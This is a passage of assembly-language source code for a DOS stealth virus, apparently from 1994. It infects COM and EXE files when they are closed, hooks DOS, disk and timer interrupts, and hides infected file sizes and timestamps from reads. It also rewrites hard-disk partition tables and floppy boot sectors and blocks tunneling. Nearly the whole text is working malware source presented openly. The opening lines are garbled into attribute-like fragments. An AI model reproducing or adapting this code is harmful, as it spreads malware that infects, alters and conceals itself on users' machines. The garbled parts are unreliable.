jmp="" call_21h="" ;set="" file="" pointer="" write_cont:="" popf="" ;restore="" file="" type="" result="" from="" stack="" jnz="" write_header="" ;branch="" if="" .com="" file="" les="" ax,dword="" ptr="" ds:[di+offset="" scratch_area-offset="" header_buffer]="" ;retrieve="" file="" size="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" mov="" dx,es="" ;move="" high="" file="" size="" into="" dx="" mov="" cl,10h="" ;number="" of="" bytes="" in="" a="" paragraph="" div="" cx="" ;convert="" header="" size="" from="" paragraphs="" to="" bytes="" sub="" ax,word="" ptr="" ds:[di+8]="" ;subtract="" header="" size="" from="" new="" file="" size="" mov="" word="" ptr="" ds:[di+14h],dx="" ;store="" new="" initial="" instruction="" pointer="" mov="" word="" ptr="" ds:[di+16h],ax="" ;store="" new="" inital="" code="" segment="" add="" dx,stack_byte_c="" ;set="" stack="" pointer="" to="" end="" of="" viral="" code="" mov="" word="" ptr="" ds:[di+0eh],ax="" ;store="" new="" initial="" stack="" pointer="" mov="" word="" ptr="" ds:[di+10h],dx="" ;store="" new="" initial="" stack="" segment="" write_header:="" mov="" dx,di="" ;move="" address="" of="" header="" into="" dx="" write_cx:="" mov="" cx,18h="" ;number="" of="" bytes="" in="" header="" write_file:="" mov="" ah,40h="" ;subfunction="" to="" write="" file="" jmp="" call_21h="" ;write="" new="" file="" header="" do_close:="" cmp="" bl,byte="" ptr="" cs:[offset="" file_handle-offset="" begin]="" ;check="" which="" handle="" is="" terminating="" ;(if="" you="" require="" more="" than="" 254="" handles,="" then="" you="" are="" greedy!)="" jnz="" close_file="" ;branch="" if="" saved="" handle="" is="" not="" terminating="" push="" ds="" ;save="" ds="" on="" stack="" push="" es="" ;save="" es="" on="" stack="" pusha="" ;save="" all="" registers="" on="" stack="" mov="" si,offset="" toggle_byte-offset="" begin="" ;area="" to="" store="" toggle="" data="" mov="" byte="" ptr="" cs:[si+offset="" file_handle-offset="" toggle_byte],0ffh="" ;specify="" file="" is="" not="" to="" be="" infected="" ;(this="" is="" safe,="" provided="" the="" handle="" number="" is="" less="" than="" 768=""><grin>)
org     $-1                                                                     ;hard-coded fixup for previous operation
        mov     al,byte ptr cs:[si]                                             ;retrieve suffix type
        and     al,closef_flag                                                  ;strip off all but close flag
        shl     al,1                                                            ;convert to suffix flag
        or      byte ptr cs:[si],suffix_flag                                    ;store suffix flag in toggle
        xor     byte ptr cs:[si],al                                             ;update suffix flag in toggle
                                                                                ;(clear if executable, set if not)
        call    hook_24h                                                        ;hook interrupt 24h
        call    set_zfp                                                         ;set file pointer to start of file
        call    infect                                                          ;infect file
        jb      ok_close                                                        ;branch if error
        mov     ax,5700h                                                        ;subfunction to retrieve file date and time
        call    call_21h                                                        ;retrieve file date and time
        inc     al                                                              ;subfuction to set file date and time
        or      cl,1fh                                                          ;set all seconds fields
        dec     cx                                                              ;set 60 seconds
        call    call_21h                                                        ;set file date and time

ok_close:
        call    restore_24h                                                     ;restore interrupt 24h
        popa                                                                    ;restore all registers from stack
        pop     es                                                              ;restore ES from stack
        pop     ds                                                              ;restore DS from stack

close_file:
        jmp     jfar_21h                                                        ;close file
        db      "*4U2NV*"                                                       ;that is, unless you're reading this...

check_disinf:
        cmp     al,2                                                            ;check requestion operation
        jnz     close_file                                                      ;branch if not set from end of file

do_disinf:
        pusha                                                                   ;save all registers on stack
        call    check_seconds                                                   ;check if file already infected
        popa                                                                    ;restore all registers from stack
        jnz     close_file                                                      ;branch if file is not infected
        cmp     ah,42h                                                          ;check requested operation
        jnz     read_or_write                                                   ;branch if not set file pointer
        push    cx                                                              ;save high file pointer position on stack
        sub     dx,code_byte_c                                                  ;hide viral code size from file pointer
        sbb     cx,0                                                            ;allow for page shift
        call    call_21h                                                        ;set file pointer into original host file
        pop     cx                                                              ;restore high file pointer position from stack
        retf    2                                                               ;return from interrupt with flags set

read_or_write:
        pusha                                                                   ;save all registers on stack
        push    ds                                                              ;save segment of buffer on stack
        push    dx                                                              ;save offset of buffer on stack
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     ax,4201h                                                        ;subfunction to retrieve file pointer
        xor     cx,cx                                                           ;set high file pointer position to 0
        cwd                                                                     ;set low file pointer position to 0
        call    call_21h                                                        ;retrieve current file pointer position
        mov     si,offset scratch_area-offset begin                             ;offset of scratch area
        mov     word ptr ds:[si],ax                                             ;save low file pointer position
        mov     word ptr ds:[si+2],dx                                           ;save high file pointer position
        dec     cx                                                              ;set high file pointer position to -1
        mov     dx,0-code_byte_c                                                ;set low file pointer position to end of host
        call    set_efp                                                         ;retrieve original host file size
        mov     word ptr ds:[si+4],ax                                           ;save low file pointer position
        mov     word ptr ds:[si+6],dx                                           ;save high file pointer position
        mov     bp,sp                                                           ;point to current top of stack
        cmp     byte ptr ss:[bp+13h],3fh                                        ;check requested operation
        jz      read_file                                                       ;branch if read
        mov     dx,offset exe_buffer-offset code_end                            ;point to original header in viral code
        call    set_efp                                                         ;set file pointer to original host header
        call    read_header                                                     ;read bytes
        push    dx                                                              ;save buffer address on stack
        call    set_zfp                                                         ;set file pointer position to start of file
        pop     dx                                                              ;restore buffer address from stack
        call    write_cx                                                        ;write original header
        mov     cx,word ptr ds:[si+6]                                           ;restore high file pointer position
        mov     dx,word ptr ds:[si+4]                                           ;restore low file pointer position
        call    set_fp                                                          ;set file pointer position to original host end
        xor     cx,cx                                                           ;number of bytes to write
        call    write_file                                                      ;truncate file (set to original length)
        jb      disinf_fp                                                       ;branch if error
        mov     byte ptr ds:[si+offset file_handle-offset scratch_area],bl      ;specify file is to be infected when closed

org     $-1                                                                     ;hard-coded fixup for previous operation
        or      byte ptr ds:[si+offset toggle_byte-offset scratch_area],closef_flag
                                                                                ;store close flag in toggle
org     $-1                                                                     ;hard-coded fixup for previous operation

disinf_fp:
        mov     cx,word ptr ds:[si+2]                                           ;restore high file pointer position
        mov     dx,word ptr ds:[si]                                             ;restore low file pointer position
        call    set_fp                                                          ;set file pointer position to initial position
        pop     ds                                                              ;discard 2 bytes from stack
        pop     ds                                                              ;restore segment of buffer from stack
        popa                                                                    ;restore all registers from stack
        jmp     jfar_21h                                                        ;proceed with write operation

read_file:
        inc     cx                                                              ;set CX to 0
        cmp     cx,word ptr ds:[si+2]                                           ;check high file pointer position
        jnz     not_header                                                      ;branch if high file pointer position > 64k
        mov     ax,18h                                                          ;bytes in header
        sub     ax,word ptr ds:[si]                                             ;allow for current file pointer position
        ja      save_head                                                       ;branch if header bytes to be read

not_header:
        xchg    cx,ax                                                           ;set header byte-count to 0

save_head:
        mov     cx,word ptr ss:[bp+10h]                                         ;retrieve requested byte-count
        cmp     cx,ax                                                           ;compare with maximum header byte-count
        jnb     save_rest                                                       ;branch if requested count is larger
        mov     ax,cx                                                           ;set header byte-count to requested byte-count

save_rest:
        sub     cx,ax                                                           ;calculate requested byte-count without header
        push    cx                                                              ;save requested byte-count on stack
        push    ax                                                              ;save header byte-count on stack
        mov     cx,0ffffh                                                       ;set high file pointer position to -1
        mov     dx,offset exe_buffer-offset code_end                            ;set low file pointer position to start of original header
        add     dx,word ptr ds:[si]                                             ;use current position as index into original header
        call    set_efp                                                         ;set file pointer position
        lds     dx,dword ptr ss:[bp]                                            ;retrieve buffer address
        mov     ah,3fh                                                          ;subfunction to read file
        pop     cx                                                              ;restore header byte-count
        call    call_21h                                                        ;read bytes
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        mov     word ptr ds:[si+8],ax                                           ;save read byte-count
        add     dx,ax                                                           ;update buffer offset with read byte-count
        push    dx                                                              ;save buffer offset on stack
        add     word ptr ds:[si],ax                                             ;retrieve low file pointer position
        mov     dx,word ptr ds:[si]                                             ;retrieve low file pointer position
        mov     cx,word ptr ds:[si+2]                                           ;retrieve high file pointer position
        call    set_fp                                                          ;set initial file pointer position
        cmp     dx,word ptr ds:[si+6]                                           ;check high file pointer position
        jb      add_request                                                     ;branch if within original file size
        ja      quit_disinf                                                     ;branch if exceeding original file size
        cmp     ax,word ptr ds:[si+4]                                           ;check low file pointer position
        jnb     quit_disinf                                                     ;branch if exceeding original file size

add_request:
        pop     bp                                                              ;restore buffer offset from stack
        pop     cx                                                              ;restore requested byte-count from stack
        add     ax,cx                                                           ;update low file pointer position
        adc     dx,0                                                            ;update high file pointer position
        cmp     dx,word ptr ds:[si+6]                                           ;check high file pointer position
        jb      read_rest                                                       ;branch if within original file size
        ja      wb_eof                                                          ;branch if exceeding original file size
        cmp     ax,word ptr ds:[si+4]                                           ;check low file pointer position
        jbe     read_rest                                                       ;branch if within original file size

wb_eof: mov     ax,word ptr ds:[si+4]                                           ;retrieve low original file size
        mov     dx,word ptr ds:[si+6]                                           ;retrieve high original file size
        sub     ax,word ptr ds:[si]                                             ;calculate low file overlap
        sbb     dx,word ptr ds:[si+2]                                           ;calculate high file overlap
        xchg    cx,ax                                                           ;move read count into CX
        jz      read_rest                                                       ;branch if within 64k
        mov     cx,word ptr ds:[si+8]                                           ;retrieve read byte-count
        not     cx                                                              ;subtract read byte-count from 64k

read_rest:
        pop     ds                                                              ;discard 2 bytes from stack
        pop     ds                                                              ;restore buffer segment from stack
        mov     ah,3fh                                                          ;subfunction to read file
        mov     dx,bp                                                           ;move buffer offset into DX
        call    call_21h                                                        ;read file
        add     word ptr cs:[si+8],ax                                           ;update read byte-count
        db      0f6h                                                            ;dummy operation to mask add and pop

quit_disinf:
        add     sp,6                                                            ;discard 6 bytes from stack
        pop     ds                                                              ;restore buffer segment from stack

set_count:
        popa                                                                    ;restore all registers from stack
        mov     ax,word ptr cs:[offset scratch_area-offset begin+8]             ;retrieve total count of bytes read
        retf    2                                                               ;return from interrupt with flags set

fix_time:
        pusha                                                                   ;save all registers on stack
        call    check_seconds                                                   ;check if file already infected
        popa                                                                    ;restore all registers from stack
        jz      check_time                                                      ;branch if file is infected
        jmp     jfar_21h                                                        ;proceed with time operation

check_time:
        or      al,al                                                           ;check requested operation
        jnz     set_time                                                        ;branch if operation is set time
        call    call_21h                                                        ;retrieve time
        and     cl,0e0h                                                         ;return 0 seconds if infected

quit_get:
        retf    2                                                               ;return from interrupt with flags set

set_time:
        push    cx                                                              ;save file time on stack
        or      cl,1fh                                                          ;set all seconds fields
        dec     cx                                                              ;set 60 seconds
        call    call_21h                                                        ;set time
        pop     cx                                                              ;restore file time from stack
        retf    2                                                               ;return from interrupt with flags set

new_12h:push    ds                                                              ;save DS on stack
        push    0                                                               ;save 0 on stack
        pop     ds                                                              ;set DS to 0
        mov     ax,word ptr ds:[413h]                                           ;retrieve current memory size
        pop     ds                                                              ;restore DS from stack
        add     ax,code_kilo_c                                                  ;restore top of system memory value
        iret                                                                    ;return from interrupt
        db      "24/06/94"                                                      ;welcome to the future of viruses

new_2fh:cmp     ax,1607h                                                        ;virtual device call out api...
        jnz     jfar_2fh
        cmp     bx,10h                                                          ;virtual hard disk device...
        jnz     jfar_2fh
        cmp     cx,3                                                            ;installation check...
        jnz     jfar_2fh
        xor     cx,cx                                                           ;prevents windows message
                                                                                ;"cannot load 32-bit disk driver"
        iret                                                                    ;return from interrupt

jfar_2fh:
        db      0eah                                                            ;jump xxxx:xxxx
        dd      0                                                               ;original interrupt 2fh here

exe_buffer:
        int     20h                                                             ;terminate first generation code
        db      0
        db      15h dup (0)                                                     ;this area contains the original header

p_offset:
        dw      0                                                               ;offset of active partition
        db      10h dup (0)                                                     ;area to contain old active partition
        db      24h dup (0)                                                     ;area to contain old partition table loader

newp_loader:
        xor     bx,bx                                                           ;zero BX
        mov     ss,bx                                                           ;set stack segment
        mov     sp,7c00h                                                        ;set stack pointer

;                  zeroing DS here will save 1 byte of code,
;                 but require an additional 1 byte of storage

        sub     word ptr cs:[413h],code_kilo_c                                  ;reduce size of total system memory

org     $-1                                                                     ;hard-coded fixup for previous operation
        int     12h                                                             ;allocate memory at top of system memory
        shl     ax,6                                                            ;convert kilobyte count to memory segment
        mov     es,ax                                                           ;retrieve segment of new top of system memory
        mov     ax,code_sect_c+200h                                             ;number of sectors in code

track:  mov     cx,2                                                            ;cylinder 0, sector 2

side:   mov     dx,80h                                                          ;of hard disk
        int     13h                                                             ;read viral code sectors to top of system memory
        push    es                                                              ;save top of system memory code segment on stack
        push    offset phook_interrupts-offset begin                            ;save top of system memory offset on stack
                                                                                ;(simulate far call)
        retf                                                                    ;return from far call
                                                                                ;(continue execution at top of system memory)
new_part:
        db      0,0,1,0,5,0,0b8h,0bh,1,0,0,0,0bch,1,0,0                         ;new active partition

phook_interrupts:
        mov     ax,1                                                            ;specify code not loaded high
        mov     di,offset toggle_byte-offset begin                              ;area to clear
        stosw                                                                   ;interrupt 12h not yet hooked,
                                                                                ;interrupt 21h not executing
                                                                                ;(incidently zeroes file handle)
        xchg    bx,ax                                                           ;zero AX
        stosw                                                                   ;specify no programs currently executing
        mov     ds,ax                                                           ;set DS to 0
        mov     ax,offset new_8-offset begin                                    ;offset of new interrupt 8 handler
        mov     cx,2                                                            ;set loop count to 2
        mov     si,20h                                                          ;offset of interrupt 8 in interrupt table
        mov     di,offset jfar_21h-offset begin+1                               ;area to store original interrupt 8 address
        cli                                                                     ;disable interrupts

hook_part:
        xchg    ax,word ptr ds:[si]                                             ;exchange old offset with new offset
        stosw                                                                   ;save original offset
        mov     ax,cs                                                           ;segment of new interrupt handler
        xchg    ax,word ptr ds:[si+2]                                           ;exchange old segment with new segment
        stosw                                                                   ;save original segment
        mov     ax,offset new_13h-offset begin                                  ;offset of new interrupt 13h handler
        mov     si,4ch                                                          ;offset of interrupt 13h in interrupt table
        mov     di,offset jfar_13h-offset begin+1                               ;area to store original interrupt 13h address
        loop    hook_part
        sti                                                                     ;enable interrupts
        mov     word ptr ds:[si+3ah],cs                                         ;destroy interrupt 21h until further notice
                                                                                ;(when system file loads, the value here will be set)
        push    ds                                                              ;save 0 on stack
        pop     es                                                              ;set ES to 0
        mov     ax,201h                                                         ;read 1 sector
        mov     bx,sp                                                           ;to offset 7c00h
        inc     cx                                                              ;cylinder 0, sector 1
        xor     dh,dh                                                           ;side 0
        pushf                                                                   ;save flags on stack
        push    es                                                              ;save code segment on stack
        push    bx                                                              ;save offset of boot sector on stack
                                                                                ;(simulate far call)
new_13h:push    ds                                                              ;save DS on stack
        push    bx                                                              ;save BX on stack
        xor     bx,bx                                                           ;zero BX
        mov     ds,bx                                                           ;set DS to 0
        lds     bx,dword ptr ds:[bx+4]                                          ;retrieve address of interrupt 1 handler
        push    word ptr ds:[bx]                                                ;save video segment:interrupt 1 handler offset
        mov     byte ptr ds:[bx],0cfh                                           ;save IRET in video segment:interrupt 1 handler offset
        push    0                                                               ;save 0 on stack
        popf                                                                    ;disable interrupt 1
        pop     word ptr ds:[bx]                                                ;restore video segment:interrupt 1 handler offset
        pop     bx                                                              ;restore BX from stack
        pop     ds                                                              ;restore DS from stack

;                    all attempts at a tunneling technique
;                      to locate the address of the BIOS
;                       will be terminated by this code

        cmp     ax,1badh                                                        ;check requested operation
        jnz     jfar_13h                                                        ;branch if not call sign

int13h_branch:
        mov     ax,0deedh                                                       ;return sign
        iret                                                                    ;return from interrupt
        or      dh,dh                                                           ;check side number
        jnz     jfar_13h                                                        ;branch if neither partition table nor boot sector
        cmp     dl,80h                                                          ;check which disk is being accessed
        ja      jfar_13h                                                        ;branch if hard disk other than C:
        cmp     cx,code_sect_c+1                                                ;check which sectors are being accessed

org     $-1                                                                     ;hard-coded fixup for previous operation
        ja      jfar_13h                                                        ;branch if not viral code sectors or partition table
        or      dl,dl                                                           ;check which drive is being accessed
        js      hard_disk                                                       ;branch if hard disk
        cmp     ah,3                                                            ;check requested operation
        jz      okay_op                                                         ;branch if write

hard_disk:
        cmp     ah,3                                                            ;check requested operation
        jz      jmp_skip                                                        ;branch if write
        cmp     ah,2                                                            ;check requested operation
        jnz     jfar_13h                                                        ;branch if not read

okay_op:push    ds                                                              ;save DS on stack
        pusha                                                                   ;save all registers on stack
        push    ax                                                              ;save AX on stack
        push    es                                                              ;save segment of buffer on stack
        pop     ds                                                              ;restore segment of buffer from stack
        push    offset cont_13h-offset begin                                    ;save offset on stack
                                                                                ;(simulate subroutine call)
call_13h:
        pushf                                                                   ;save flags on stack
        push    cs                                                              ;save code segment on stack
        push    offset known_ret-offset begin                                   ;save offset on stack
                                                                                ;(simulate interrupt call)
jfar_13h:
        db      0eah                                                            ;jump xxxx:xxxx
        dd      0                                                               ;original interrupt 13h here

jmp_skip:
        jmp     skip_op                                                         ;branch to quit handler

cont_13h:
        mov     bp,sp                                                           ;point to current top of stack
        mov     word ptr ss:[bp+10h],ax                                         ;save return code on stack
        pop     ax                                                              ;restore AX from stack
        jb      jmp_quit                                                        ;branch if error occurred
        dec     cx                                                              ;check which sectors are being accessed
        jnz     vir_sectors                                                     ;branch if not accessing partition table
        or      dl,dl                                                           ;check which disk is being accessed
        jns     boot_area                                                       ;branch if not hard disk

disinf_hdd:
        cmp     word ptr ds:[bx+offset new_part-offset newp_loader-3],offset phook_interrupts-offset begin
                                                                                ;check partition table
        jnz     jmp_quit                                                        ;branch if not infected
        mov     cl,move_isize   ;directive at end of code to calculate this     ;active partition byte-count

org     $-2                                                                     ;hard-coded fixup for previous operation
        mov     si,offset p_offset-offset begin+2                               ;offset of area containing original partition table
        mov     di,word ptr cs:[si-2]                                           ;retrieve offset of partition information
        add     di,bx                                                           ;allow for the code offset
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to save and set DS)
        repz                                                                    ;repeat until CX = 0...
        db      move_ptype      ;directive at end of code to calculate this     ;restore original partition information
        mov     cl,move_psize   ;directive at end of code to calculate this     ;new partition table loader byte-count

org     $-2                                                                     ;hard-coded fixup for previous operation
        mov     di,bx                                                           ;move offset of partition table into DI
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to save and set DS)
        repz                                                                    ;repeat until CX = 0...
        db      move_ptype      ;directive at end of code to calculate this     ;restore original partition table code
        dec     al                                                              ;reduce number of sectors by 1
        jz      quit_part                                                       ;branch if only 1 sector requested
        add     bx,200h                                                         ;skip partition table

vir_sectors:
        or      dl,dl                                                           ;check which disk is being accessed
        jns     quit_part                                                       ;branch if not hard disk
        cmp     al,code_sect_c                                                  ;check number of sectors being accessed
        jb      set_loop                                                        ;branch if fewer than viral sectors
        mov     al,code_sect_c                                                  ;set sectors read to number of viral sectors

set_loop:
        cbw                                                                     ;only want the sector count
        mov     cx,200h                                                         ;number of bytes in a sector
        mul     cx                                                              ;calculate number of bytes to clear
        xchg    ax,cx                                                           ;set store byte to 0
        mov     di,bx                                                           ;move offset of sectors to blank into DI

clear_sectors:
        stosb                                                                   ;clear viral code sectors in memory
        loop    clear_sectors                                                   ;repeat while sectors remain
                                                                                ;(pretend sectors are blank)
jmp_quit:
        jmp     short quit_part                                                 ;branch to quit handler

boot_area:
        cmp     word ptr ds:[bx+offset new_part-offset newp_loader+3bh],offset phook_interrupts-offset begin
                                                                                ;check boot sector
        jz      disinf                                                          ;branch if infected
        call    calc_sect                                                       ;calculate last available sectors

save_track:
        push    es                                                              ;save segment of buffer on stack
        push    bx                                                              ;save offset of buffer on stack
        push    cx                                                              ;save track number on stack
        push    cs                                                              ;save CS on stack
        pop     es                                                              ;restore CS from stack
        mov     ax,300h+code_sect_c                                             ;number of sectors to write
        xor     bx,bx                                                           ;set write offset to 0
        sub     cx,code_sect_c                                                  ;calculate first sector to write

org     $-1                                                                     ;hard-coded fixup for previous operation
        mov     word ptr cs:[offset track-offset begin+1],cx                    ;save track of available sectors
        push    dx                                                              ;save DX on stack
        xor     dl,dl                                                           ;set drive to A:
        mov     word ptr cs:[offset side-offset begin+1],dx                     ;save side of available sectors
        pop     dx                                                              ;restore DX from stack
        call    call_13h                                                        ;write sectors
        or      ah,ah                                                           ;check return code
        mov     ax,301h                                                         ;write 1 sector
        pop     cx                                                              ;restore track number from stack
        pop     bx                                                              ;restore offset of buffer from stack
        pop     es                                                              ;restore segment of buffer from stack
        jnz     quit_part                                                       ;branch if error occurred
        push    ax                                                              ;save AX on stack
        call    call_13h                                                        ;save original boot sector
        mov     word ptr ds:[bx],3cebh                                          ;store initial jump to new boot code
        mov     cx,move_psize                                                   ;number of bytes in new boot code

org     $-1                                                                     ;hard-coded fixup for previous operation
        mov     si,offset newp_loader-offset begin                              ;offset of new boot code
        lea     di,word ptr [bx+3eh]                                            ;offset of area to store new boot code
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to save and set DS)
        repz                                                                    ;repeat until CX = 0...
        db      move_ptype                                                      ;store new boot code
        pop     ax                                                              ;restore AX from stack
        mov     cx,1                                                            ;to cylinder 0, sector 1
        xor     dh,dh                                                           ;side 0
        call    call_13h                                                        ;write new boot sector

disinf: call    calc_sect                                                       ;calculate last available sectors
        mov     ax,201h                                                         ;read 1 sector
        call    call_13h                                                        ;read boot sector

quit_part:
        popa                                                                    ;restore all registers from stack
        pop     ds                                                              ;restore DS from stack

skip_op:retf    2                                                               ;return from interrupt with flags set

calc_sect:
        mov     ax,word ptr ds:[bx+13h]                                         ;retrieve total sector count
        mov     cx,word ptr ds:[bx+18h]                                         ;retrieve sectors per track count
        push    dx                                                              ;save DX on stack
        cwd                                                                     ;zero DX
        div     word ptr ds:[bx+1ah]                                            ;divide total sector count by head count
        div     cx                                                              ;divide remainder by sectors per track count
        dec     ax                                                              ;subtract 1 track
        mov     ch,al                                                           ;store track number in CH
        pop     dx                                                              ;restore DX from stack
        mov     dh,byte ptr ds:[bx+1ah]                                         ;retrieve head count
        dec     dh                                                              ;subtract 1 head
        ret                                                                     ;return from subroutine

new_8:  call    call_21h                                                        ;simulate interrupt call
                                                                                ;(contains original interrupt 8 address)
        cli                                                                     ;disable interrupts
        push    es                                                              ;save ES on stack
        push    0                                                               ;save 0 on stack
        pop     es                                                              ;set ES to 0
        push    di                                                              ;save DI on stack
        mov     di,20h                                                          ;offset of interrupt 8 in interrupt table
        cmp     word ptr es:[di+66h],1000h                                      ;check owner of interrupt 21h
        jnb     exit_8                                                          ;branch if system file has not loaded yet
        push    si                                                              ;save SI on stack
        mov     si,offset jfar_21h-offset begin+1                               ;offset of original interrupt 8 address
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to set DS)
        movsw                                                                   ;restore original offset
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to set DS)
        movsw                                                                   ;restore original code segment
        push    ds                                                              ;save DS on stack
        push    es                                                              ;save 0 on stack
        pop     ds                                                              ;set DS to 0
        mov     si,84h                                                          ;code segment pointer to MSDOS.SYS (or equivalent)
        call    hook_int                                                        ;hook interrupt
        pop     ds                                                              ;restore DS from stack
        pop     si                                                              ;restore SI from stack

exit_8: pop     di                                                              ;restore DI from stack
        pop     es                                                              ;restore ES from stack
        sti                                                                     ;enable interrupts
        iret                                                                    ;return from interrupt

code_end:


;                                     DATA
;              used while resident, not present in infected files
;                              size = 52/53 bytes

header_buffer   equ     offset $+(offset code_end-offset begin+1)/2-(offset code_end-offset begin)/2
                                                                                ;area to contain original file header during infection
scratch_area    equ     offset header_buffer+18h                                ;scratch area for infection and disinfection

old21h_code     equ     offset scratch_area+0ah                                 ;area to contain original 5 bytes of interrupt handler

toggle_byte     equ     offset old21h_code+5                                    ;toggle switch

file_handle     equ     offset toggle_byte+1                                    ;area to contain handle number of file to infect on closed

process_no      equ     offset file_handle+1                                    ;area to contain number of currently executing process

process_off     equ     offset process_no+2                                     ;area to contain offset of first process

process_seg     equ     offset process_off+2                                    ;area to contain segment of first process

total_end       equ     offset process_seg+2

quit_code:

;assembler directive below:
init_part       equ offset new_part-offset newp_loader                          ;length of initial code
even_part       equ init_part/2*2                                               ;length of 'even'ed code

        ife     init_part-even_part                                             ;if code length is even then
                move_isize=(offset phook_interrupts-offset new_part)/2          ;use half of the length of code
                move_psize=init_part/2                                          ;use half of the length of code
                move_ptype=0a5h                                                 ;and MOVSW
        else                                                                    ;otherwise
                move_isize=offset phook_interrupts-offset new_part              ;use the inital length of code
                move_psize=init_part                                            ;use the inital length of code
                move_ptype=0a4h                                                 ;and MOVSB
        endif                                                                   ;end directive

end     begin

</grin>